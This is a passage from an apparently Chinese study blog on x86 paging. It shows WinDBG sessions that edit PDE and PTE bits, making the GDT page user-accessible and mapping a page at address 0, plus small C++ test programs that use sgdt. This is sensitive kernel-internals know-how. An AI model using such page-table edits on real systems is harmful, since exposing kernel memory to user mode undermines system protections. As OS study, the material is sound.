class="string">&quot;asdasdgsdfa&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%x\r\n&quot;</span>, x);</span><br><span class="line"></span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\r\n&quot;</span>, x);</span><br><span class="line">x[<span class="number">0</span>] = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\r\n&quot;</span>, x);</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="U-S位（user-super）"><a href="#U-S位（user-super）" class="headerlink" title="U&#x2F;S位（user&#x2F;super）"></a>U&#x2F;S位（user&#x2F;super）</h3><blockquote><p>如果U&#x2F;S位为0, 代表只有内核可以访问页;<br>如果U&#x2F;S位为1, 代表三环可以访问页;</p></blockquote><h4 id="代码实验-1"><a href="#代码实验-1" class="headerlink" title="代码实验"></a>代码实验</h4><blockquote><ol><li>拆分地址<br>80b98800 &#x3D;&gt; 0010 0000 0010 | 0011 1001 1000 | 1000 0000 0000<br>0010 0000 0010 &#x3D;&gt; 202 &#x2F;&#x2F; 前面的往后移, 前面补0<br>0011 1001 1000 &#x3D;&gt; 398<br>1000 0000 0000 &#x3D;&gt; 100</li></ol></blockquote><blockquote><ol start="2"><li>查询gdtr属性</li></ol></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; !pte <span class="number">0x80b98800</span>     <span class="comment">// 查询默认gdtr地址</span></span><br><span class="line">                 VA <span class="number">80b</span>98800</span><br><span class="line">PDE at C0300808         PTE at C0202E60</span><br><span class="line">contains <span class="number">0018</span>A063       contains <span class="number">00B</span>98163   <span class="comment">// 最后一位是3（0011）, 代表P位和R/W位有值, U/S位为0, 意味着用户模式下访问不到, 只能内核访问</span></span><br><span class="line">pfn <span class="number">18</span>a   ---DA--KWEV   pfn b98   -G-DA--KWEV</span><br></pre></td></tr></table></figure><blockquote><ol start="3"><li>WinDBG中设置</li></ol></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; !dd <span class="number">0199</span>a000+<span class="number">202</span>*<span class="number">4</span>      <span class="comment">// 获取当前进程的PDE</span></span><br><span class="line"># <span class="number">199</span>a808 <span class="number">0018</span>a063 <span class="number">3</span>d3c7863 <span class="number">001b</span>7063 <span class="number">001b</span>8063</span><br><span class="line"># <span class="number">199</span>a818 <span class="number">001b</span>9063 <span class="number">001b</span>a063 <span class="number">001b</span>b063 <span class="number">001b</span>c063</span><br><span class="line"># <span class="number">199</span>a828 <span class="number">001b</span>d063 <span class="number">001b</span>e063 <span class="number">001b</span>f063 <span class="number">21</span>a3c863</span><br><span class="line"># <span class="number">199</span>a838 <span class="number">210</span>aa863 <span class="number">001</span>c2063 <span class="number">001</span>c3063 <span class="number">001</span>c4063</span><br><span class="line"># <span class="number">199</span>a848 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">001</span>c7063 <span class="number">05400863</span></span><br><span class="line"># <span class="number">199</span>a858 <span class="number">05801863</span> <span class="number">3f</span>ec0863 <span class="number">3f</span>e81863 <span class="number">3f</span>e82863</span><br><span class="line"># <span class="number">199</span>a868 <span class="number">3f</span>e83863 <span class="number">3f</span>e84863 <span class="number">3f</span>e85863 <span class="number">3f</span>e86863</span><br><span class="line"># <span class="number">199</span>a878 <span class="number">3f</span>e87863 <span class="number">18</span>c23863 <span class="number">3</span>a3a8863 <span class="number">3</span>d3c3863</span><br><span class="line">kd&gt; !ed <span class="number">199</span>a808 <span class="number">0018</span>a067    <span class="comment">// 设置PDE中U/S位为1</span></span><br><span class="line">kd&gt; !dd <span class="number">0199</span>a000+<span class="number">202</span>*<span class="number">4</span></span><br><span class="line"># <span class="number">199</span>a808 <span class="number">0018</span>a067 <span class="number">3</span>d3c7863 <span class="number">001b</span>7063 <span class="number">001b</span>8063</span><br><span class="line"># <span class="number">199</span>a818 <span class="number">001b</span>9063 <span class="number">001b</span>a063 <span class="number">001b</span>b063 <span class="number">001b</span>c063</span><br><span class="line"># <span class="number">199</span>a828 <span class="number">001b</span>d063 <span class="number">001b</span>e063 <span class="number">001b</span>f063 <span class="number">21</span>a3c863</span><br><span class="line"># <span class="number">199</span>a838 <span class="number">210</span>aa863 <span class="number">001</span>c2063 <span class="number">001</span>c3063 <span class="number">001</span>c4063</span><br><span class="line"># <span class="number">199</span>a848 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">001</span>c7063 <span class="number">05400863</span></span><br><span class="line"># <span class="number">199</span>a858 <span class="number">05801863</span> <span class="number">3f</span>ec0863 <span class="number">3f</span>e81863 <span class="number">3f</span>e82863</span><br><span class="line"># <span class="number">199</span>a868 <span class="number">3f</span>e83863 <span class="number">3f</span>e84863 <span class="number">3f</span>e85863 <span class="number">3f</span>e86863</span><br><span class="line"># <span class="number">199</span>a878 <span class="number">3f</span>e87863 <span class="number">18</span>c23863 <span class="number">3</span>a3a8863 <span class="number">3</span>d3c3863</span><br><span class="line">kd&gt; !dd <span class="number">0018</span>a000+<span class="number">398</span>*<span class="number">4</span>      <span class="comment">// 查询当前进程的PTE</span></span><br><span class="line">#  <span class="number">18</span>ae60 <span class="number">00b</span>98163 <span class="number">00b</span>99163 <span class="number">00b</span>9a163 <span class="number">00b</span>9b163</span><br><span class="line">#  <span class="number">18</span>ae70 <span class="number">00b</span>9c163 <span class="number">00b</span>9d163 <span class="number">00b</span>9e163 <span class="number">00b</span>9f163</span><br><span class="line">#  <span class="number">18</span>ae80 <span class="number">00b</span>a0163 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#  <span class="number">18</span>ae90 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#  <span class="number">18</span>aea0 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#  <span class="number">18</span>aeb0 <span class="number">00b</span>ac963 <span class="number">00b</span>ad121 <span class="number">00b</span>ae121 <span class="number">00b</span>af963</span><br><span class="line">#  <span class="number">18</span>aec0 <span class="number">03</span>d01060 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#  <span class="number">18</span>aed0 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">kd&gt; !ed <span class="number">18</span>ae60 <span class="number">00b</span>98167     <span class="comment">// 设置PTE的U/S位为1</span></span><br><span class="line">kd&gt; !dd <span class="number">0018</span>a000+<span class="number">398</span>*<span class="number">4</span></span><br><span class="line">#  <span class="number">18</span>ae60 <span class="number">00b</span>98167 <span class="number">00b</span>99163 <span class="number">00b</span>9a163 <span class="number">00b</span>9b163</span><br><span class="line">#  <span class="number">18</span>ae70 <span class="number">00b</span>9c163 <span class="number">00b</span>9d163 <span class="number">00b</span>9e163 <span class="number">00b</span>9f163</span><br><span class="line">#  <span class="number">18</span>ae80 <span class="number">00b</span>a0163 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#  <span class="number">18</span>ae90 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#  <span class="number">18</span>aea0 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#  <span class="number">18</span>aeb0 <span class="number">00b</span>ac963 <span class="number">00b</span>ad121 <span class="number">00b</span>ae121 <span class="number">00b</span>af963</span><br><span class="line">#  <span class="number">18</span>aec0 <span class="number">03</span>d01060 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#  <span class="number">18</span>aed0 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">kd&gt; !vtop <span class="number">0199</span>a000 <span class="number">0x80b98800</span>       <span class="comment">// 查询当前进程的CR3信息</span></span><br><span class="line">X86VtoP: Virt <span class="number">0000000080b</span>98800, pagedir <span class="number">000000000199</span>a000</span><br><span class="line">X86VtoP: PDE <span class="number">000000000199</span>a808 - <span class="number">0018</span>a067</span><br><span class="line">X86VtoP: PTE <span class="number">000000000018</span>ae60 - <span class="number">00b</span>98167</span><br><span class="line">X86VtoP: Mapped phys <span class="number">0000000000b</span>98800</span><br><span class="line">Virtual address <span class="number">80b</span>98800 translates to physical address b98800.</span><br><span class="line">kd&gt; !ed <span class="number">18</span>ae60 <span class="number">00b</span>98067         <span class="comment">// 设置PTE的G位为1</span></span><br><span class="line">kd&gt; !dd <span class="number">0018</span>a000+<span class="number">398</span>*<span class="number">4</span></span><br><span class="line">#  <span class="number">18</span>ae60 <span class="number">00b</span>98067 <span class="number">00b</span>99163 <span class="number">00b</span>9a163 <span class="number">00b</span>9b163</span><br><span class="line">#  <span class="number">18</span>ae70 <span class="number">00b</span>9c163 <span class="number">00b</span>9d163 <span class="number">00b</span>9e163 <span class="number">00b</span>9f163</span><br><span class="line">#  <span class="number">18</span>ae80 <span class="number">00b</span>a0163 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#  <span class="number">18</span>ae90 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#  <span class="number">18</span>aea0 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#  <span class="number">18</span>aeb0 <span class="number">00b</span>ac963 <span class="number">00b</span>ad121 <span class="number">00b</span>ae121 <span class="number">00b</span>af963</span><br><span class="line">#  <span class="number">18</span>aec0 <span class="number">03</span>d01060 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#  <span class="number">18</span>aed0 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">kd&gt; !vtop <span class="number">0199</span>a000 <span class="number">0x80b98800</span>       <span class="comment">// 查询当前进程的CR3信息</span></span><br><span class="line">X86VtoP: Virt <span class="number">0000000080b</span>98800, pagedir <span class="number">000000000199</span>a000</span><br><span class="line">X86VtoP: PDE <span class="number">000000000199</span>a808 - <span class="number">0018</span>a067</span><br><span class="line">X86VtoP: PTE <span class="number">000000000018</span>ae60 - <span class="number">00b</span>98067</span><br><span class="line">X86VtoP: Mapped phys <span class="number">0000000000b</span>98800</span><br><span class="line">Virtual address <span class="number">80b</span>98800 translates to physical address b98800.</span><br></pre></td></tr></table></figure><blockquote><ol start="4"><li>实验代码</li></ol></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 10_14_PageProperties(页属性).cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// u/s位代码试验</span></span><br><span class="line"><span class="type">char</span> buf[<span class="number">6</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line">sgdt buf;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> address = *(PULONG)&amp;buf[<span class="number">2</span>];</span><br><span class="line"><span class="type">int</span> * x = (<span class="type">int</span>*)address;</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%x\r\n&quot;</span>, *x);</span><br><span class="line"></span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="A位"><a href="#A位" class="headerlink" title="A位"></a>A位</h3><blockquote><p>不是人为设置, 如果从来没有访问过可能是个0, 一旦访问过一次（读或者写）就会变成1;</p></blockquote><h3 id="G位（全局页）"><a href="#G位（全局页）" class="headerlink" title="G位（全局页）"></a>G位（全局页）</h3><h2 id="挂页（幽灵地址）"><a href="#挂页（幽灵地址）" class="headerlink" title="挂页（幽灵地址）"></a>挂页（幽灵地址）</h2><h3 id="申请内存并挂到0地址上"><a href="#申请内存并挂到0地址上" class="headerlink" title="申请内存并挂到0地址上"></a>申请内存并挂到0地址上</h3><blockquote><ol><li>拆地址<br>1d0000 &#x3D;&gt; 0000 0000 00 | 01 1101 0000 | 0000 0000 0000<br>0000 0000 0000 &#x3D;&gt; 0<br>0001 1101 0000 &#x3D;&gt; 1d0<br>0000 0000 0000 &#x3D;&gt; 0</li></ol></blockquote><blockquote><ol start="2"><li>WinDBG中设置<br>PTE: 04922847</li></ol></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; !dd <span class="number">1</span>c2c5000        <span class="comment">// 通过CR3获取PDE</span></span><br><span class="line">#<span class="number">1</span>c2c5000 <span class="number">23325867</span> <span class="number">06e4</span>b867 <span class="number">00000000</span> <span class="number">376e3867</span></span><br><span class="line">#<span class="number">1</span>c2c5010 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">1</span>c2c5020 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">1</span>c2c5030 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">1</span>c2c5040 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">1</span>c2c5050 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">1</span>c2c5060 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">1</span>c2c5070 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">kd&gt; !dd <span class="number">23325000</span>+<span class="number">1</span>d0*<span class="number">4</span>      <span class="comment">// 获取PTE</span></span><br><span class="line">#<span class="number">23325740</span> <span class="number">04922847</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">23325750</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">23325760</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">23325770</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">23325780</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">23325790</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">233257</span>a0 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">233257b</span>0 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">kd&gt; !dd <span class="number">04922000</span>            <span class="comment">// 查看PTE</span></span><br><span class="line"># <span class="number">4922000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"># <span class="number">4922010</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"># <span class="number">4922020</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"># <span class="number">4922030</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"># <span class="number">4922040</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"># <span class="number">4922050</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"># <span class="number">4922060</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"># <span class="number">4922070</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">kd&gt; !dd <span class="number">1</span>c2c5000            <span class="comment">// 获取PDE</span></span><br><span class="line">#<span class="number">1</span>c2c5000 <span class="number">23325867</span> <span class="number">06e4</span>b867 <span class="number">00000000</span> <span class="number">376e3867</span></span><br><span class="line">#<span class="number">1</span>c2c5010 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">1</span>c2c5020 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">1</span>c2c5030 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">1</span>c2c5040 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">1</span>c2c5050 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">1</span>c2c5060 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">1</span>c2c5070 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">kd&gt; !dd <span class="number">23325000</span>            <span class="comment">// 查看PDE</span></span><br><span class="line">#<span class="number">23325000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">23325010</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">23325020</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">23325030</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">23325040</span> <span class="number">0b</span>841847 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">23325050</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">23325060</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">23325070</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">kd&gt; !ed <span class="number">23325000</span> <span class="number">04922847</span>       <span class="comment">// 将PDE指针指向PTE的值（04922847）</span></span><br><span class="line">kd&gt; !dd <span class="number">23325000</span></span><br><span class="line">#<span class="number">23325000</span> <span class="number">04922847</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">23325010</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">23325020</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">23325030</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">23325040</span> <span class="number">0b</span>841847 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">23325050</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">23325060</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">23325070</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">kd&gt; g</span><br><span class="line">Break instruction exception - code <span class="number">80000003</span> (first chance)</span><br><span class="line">nt!RtlpBreakWithStatusInstruction:</span><br><span class="line"><span class="number">84066</span>ed0 cc              <span class="type">int</span>     <span class="number">3</span></span><br><span class="line">kd&gt; !dd <span class="number">23325000</span></span><br><span class="line">#<span class="number">23325000</span> <span class="number">04922867</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">23325010</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">23325020</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">23325030</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">23325040</span> <span class="number">0b</span>841847 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">23325050</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">23325060</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">23325070</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">kd&gt; !db <span class="number">04922000</span>        <span class="comment">// 成功修改成100（0x64）</span></span><br><span class="line"># <span class="number">4922000</span> <span class="number">64</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span><span class="number">-00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> d...............</span><br><span class="line"># <span class="number">4922010</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span><span class="number">-00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> ................</span><br><span class="line"># <span class="number">4922020</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span><span class="number">-00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> ................</span><br><span class="line"># <span class="number">4922030</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span><span class="number">-00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> ................</span><br><span class="line"># <span class="number">4922040</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span><span class="number">-00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> ................</span><br><span class="line"># <span class="number">4922050</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span><span class="number">-00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> ................</span><br><span class="line"># <span class="number">4922060</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span><span class="number">-00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> ................</span><br><span class="line"># <span class="number">4922070</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span><span class="number">-00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> ................</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><ol start="3"><li>实验代码</li></ol></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 